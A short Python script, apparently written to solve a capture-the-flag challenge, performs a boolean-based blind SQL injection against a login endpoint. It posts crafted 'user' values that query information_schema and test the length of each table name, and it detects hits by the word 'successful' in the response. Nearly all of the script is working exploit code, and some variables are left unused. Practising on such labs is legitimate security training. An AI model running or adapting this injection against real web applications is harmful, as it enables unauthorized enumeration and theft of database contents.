import requests
dict="qazwsxedcrfvtgbyhnujmikolp123456789{}-"
url="http://mashang.eicp.vip:1650/api/yucctf/sqli_4/sql2.php"
flag=""
for w in range(0,3):
    for i in range(1,10):
         payload = "1' or if(length(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),1))=%d,1,0)-- "%(w,i)
         data = {"user":payload,"passwd":"1"}
         r=requests.post(url,data=data)
         if 'successful' in r.text:
             print(i)
